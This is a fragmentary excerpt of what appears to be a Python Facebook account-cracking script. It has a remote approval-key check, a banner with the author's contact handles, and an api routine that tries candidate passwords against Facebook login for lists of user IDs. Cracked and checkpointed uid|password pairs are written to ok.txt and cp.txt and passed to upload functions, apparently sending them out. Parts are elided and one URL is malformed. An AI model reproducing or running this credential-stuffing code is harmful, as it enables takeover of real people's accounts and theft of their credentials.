...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.comHacker25802/approval.txt/blob/main/Ap.txt"])
	exit(" [*] FACEBOOK :  Tajul Islam M.M.M")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰Tajul\•\_____❹⓿❹ ;* :) 3:)")
	subprocess.check_output(["am", "start", "https://m.me/8801814032575"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com//approval.txt/blob/main/Ap.txt').text
			if basesplit in plr:
				key = basesplit
...
\033 ▀█▀ ▄▀█ ░░█ █░█ █░░ █ █▀ █░░ ▄▀█ █▀▄▀█
 \033░█░ █▀█ █▄█ █▄█ █▄▄ █ ▄█ █▄▄ █▀█ █░▀░█
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : Tajul Islam Rabbi\•\_____❹⓿❹ ;* :) 3:)
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : Hacker Live Real Course-আবেগ💔🥀
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : TAJUL
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 01814023575
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [TAJUL_OLD] : %s/%s -> \033[0;92m [ TAJUL-OK:%s ]- \033[0;91m[TAJUL-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [TAJUL-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[TAJUL-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [TAJUL-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
